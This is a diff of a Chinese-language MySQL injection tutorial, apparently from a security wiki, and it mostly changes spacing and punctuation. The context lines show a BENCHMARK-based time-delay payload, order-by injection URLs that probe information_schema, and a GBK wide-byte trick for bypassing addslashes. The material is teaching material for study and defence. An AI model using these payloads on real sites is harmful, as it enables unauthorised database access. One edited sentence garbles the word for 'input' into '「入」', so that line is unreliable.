@@ -173,11 +173,11 @@ SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
 SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
 ```
 
-使用 `CONCAT()` 时，任何个参数为 null，将返回 null， 推荐使用 `CONCAT_WS()` 。`CONCAT_WS()` 函数第一个参数表示用哪个字符间隔所查询的结果。
+使用 `CONCAT()` 时，任何个参数为 null，将返回 null，推荐使用`CONCAT_WS()` 。`CONCAT_WS()`函数第一个参数表示用哪个字符间隔所查询的结果。
 
 ### 条件语句
 
-`CASE`、`IF()`、`IFNULL()`、`NULLIF()`。
+`CASE`, `IF()`, `IFNULL()`, `NULLIF()`. 
 
 ```sql
 SELECT IF(1=1, true, false);
@@ -186,13 +186,13 @@ SELECT CASE WHEN 1=1 THEN true ELSE false END;
 
 ### 延时函数
 
-`SLEEP()`、`BENCHMARK()`。
+`SLEEP()`, `BENCHMARK()`. 
 
 ```sql
 ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
 ```
 
-### order by后的注入
+### order by 后的注入
 
 `order by` 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 `order` 或者 `order by` 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
 
@@ -211,7 +211,7 @@ http://www.test.com/list.php?order=rand(true)
 http://www.test.com/list.php?order=rand(false)
 ````
 
-以上两个会返回不同的排序，判断表名中第一个字符是否小于128的语句如下：
+以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：
 
 ````
 http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
@@ -219,7 +219,7 @@ http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) 
 
 ### 宽字节注入
 
-国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你输入 `%bf%27` 时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c` 在 GBK 中变为一个宽字符“縗”。`%bf` 那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
+国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你「入」`%bf%27` 时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c`在 GBK 中变为一个宽字符“縗”。`%bf`那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
 
 ## 参考资料
 
@@ -227,5 +227,5 @@ http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) 
 - [MySQL 注入技巧](http://static.hx99.net/static/drops/tips-7299.html)
 - [MySQL 注入科普](http://static.hx99.net/static/drops/tips-123.html)
 - [MySQL 注入总结](http://www.91ri.org/4073.html)
-- [《SQL注入攻击与防御》](http://product.dangdang.com/23364650.html)
+- [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)
 
